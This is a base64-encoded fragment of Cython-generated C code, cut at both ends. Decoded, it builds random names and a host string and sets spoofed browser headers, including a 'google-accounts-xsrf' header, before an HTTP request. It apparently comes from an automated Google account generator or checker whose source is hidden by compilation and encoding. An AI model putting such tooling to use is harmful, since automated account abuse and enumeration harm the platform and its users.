YXIoKTtcbiAgICAgICAgfVxuICAgICAgICBicmVhaztcbiAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfaSk7XG4gICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2ksIF9fcHl4X3RfNCk7XG4gICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgX19weXhfdF81ID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzggPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfN307XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpO1xuXG4gIFxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHtcbiAgICBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKDApO1xuICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICB9XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpO1xuICAjZW5kaWZcbiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTtcbiAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKChQeU9iamVjdCopX19weXhfZ2VuZXJhdG9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yanFfMnRsbChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X24xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfbjIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9ob3N0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaGUzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3RvayA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2Nvb2tpZXMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9oZWFkZXJzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdGwgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9mID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF9nYl8yanFfM3RsbF8yZ2VuZXJhdG9yID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X2diXzJqcV8zdGxsXzVnZW5lcmF0b3IxID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X2diXzJqcV8zdGxsXzhnZW5lcmF0b3IyID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzk7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTFbMTFdO1xuICBQeU9iamVjdCAqX19weXhfdF8xMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTdbNF07XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE4ID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfMTk7XG4gIGludCBfX3B5eF90XzIwO1xuICBpbnQgX19weXhfdF8yMTtcbiAgaW50IF9fcHl4X3RfMjI7XG4gIGNoYXIgY29uc3QgKl9fcHl4X3RfMjM7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzI0ID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgidGxsIiwgMCk7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBOVUxMO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcmFuZ2UpO1xuICAgICAgX19weXhfdF82ID0gX19weXhfYnVpbHRpbl9yYW5nZTsgXG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTMxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTMxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90Xzh9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMzEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3BmXzJqcV8zdGxsX2dlbmV4cHIoTlVMTCwgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTMxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMzEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIsIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19weXhfdl9uMSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IE5VTEw7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9yYW5nZSk7XG4gICAgICBfX3B5eF90XzggPSBfX3B5eF9idWlsdGluX3JhbmdlOyBcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfN307XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgfVxuICAgICAgX19weXhfdF84ID0gX19weXhfcGZfMmpxXzN0bGxfM2dlbmV4cHIoTlVMTCwgX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgIF9fcHl4X3RfOCA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIsIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgX19weXhfdl9uMiA9ICgoUHlPYmplY3QqKV9fcHl4X3RfOCk7XG4gICAgICBfX3B5eF90XzggPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IE5VTEw7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9yYW5nZSk7XG4gICAgICBfX3B5eF90XzcgPSBfX3B5eF9idWlsdGluX3JhbmdlOyBcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X3RfNX07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgfVxuICAgICAgX19weXhfdF83ID0gX19weXhfcGZfMmpxXzN0bGxfNmdlbmV4cHIoTlVMTCwgX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICBfX3B5eF90XzggPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fcHl4X3RfNyA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIsIF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgX19weXhfdl9ob3N0ID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEzNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTM1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjZXB0X2xhbmd1YWdlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FyX0lRX2FyX3FfMF85X2VuX0lRX3FfMF84X2VuX3EpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTM1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGVudF90eXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dvb2dsZV9hY2NvdW50c194c3JmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTM1LCBfX3B5eF9MM19lcnJvcilcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMzksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7XG4gICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzUpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMS1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTM5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICB9XG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VyX2FnZW50LCBfX3B5eF90XzYpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTM1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgX19weXhfdl9oZTMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE0MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTQxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX